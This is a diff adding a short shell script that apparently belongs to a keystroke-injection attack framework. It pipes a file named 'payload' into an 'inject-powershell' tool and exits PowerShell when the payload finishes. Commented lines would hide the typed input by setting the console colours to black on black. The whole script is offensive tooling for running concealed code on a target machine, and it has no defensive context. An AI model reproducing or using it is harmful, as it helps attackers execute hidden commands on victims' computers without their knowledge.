@@ -1,0 +1,15 @@
+#!/bin/sh
+
+CWD=`dirname $0`
+ARG=$1
+
+(
+# Hide input
+#echo "[console]::ForegroundColor = \"Black\""
+#echo "[console]::BackgroundColor = \"Black\""
+# Dump payload
+cat ${CWD}/payload
+# Exit powershell after payload exit
+echo #exit
+) | ${PLPATH}/inject-powershell
+
